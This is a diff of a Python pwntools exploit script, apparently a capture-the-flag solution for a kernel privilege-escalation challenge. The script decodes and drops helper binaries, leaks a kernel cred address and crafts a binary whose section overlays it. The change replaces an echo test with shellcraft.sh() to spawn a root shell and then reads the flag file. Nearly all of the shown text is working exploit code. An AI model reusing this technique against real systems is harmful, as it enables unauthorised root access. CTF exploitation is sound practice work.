@@ -346,9 +346,7 @@ sp( "echo %s | base64 -d > ./leak" % ( base64.b64encode( p4 ) ) )
 sp( 'chmod +x ./leak' )
 cred = leak() # 1
 
-print shellcraft.echo('Hellofewfew')
-
-p4 = gen_p4_binary( sections = [[0x7000000 | 7, 0x1000, 0], [cred | 8 + 0x10, 0x48, 0]] , sections_len = 2  , entry = 0x7000090 , code = asm( shellcraft.echo('Hellofewfew\n') + shellcraft.exit(0) ) )
+p4 = gen_p4_binary( sections = [[0x7000000 | 7, 0x1000, 0], [cred | 8 + 0x10, 0x48, 0]] , sections_len = 2  , entry = 0x7000090 , code = asm( shellcraft.sh() ) )
 sp( 'printf \'\\%s\' > ./pwn' % '\\'.join( oct( ord( _ ) )[1:].rjust( 3 ,'0' ) for _ in p4 ) )
 sp( 'chmod +x ./pwn' )
 
@@ -371,7 +369,7 @@ for _ in range(3):
 
 sp( './pwn' ) # cred should be the same as first leak
 
-y.sendlineafter( '/tmp #' , 'id && cat /flag' ) # root !
+y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !
 
 y.interactive()
 ```
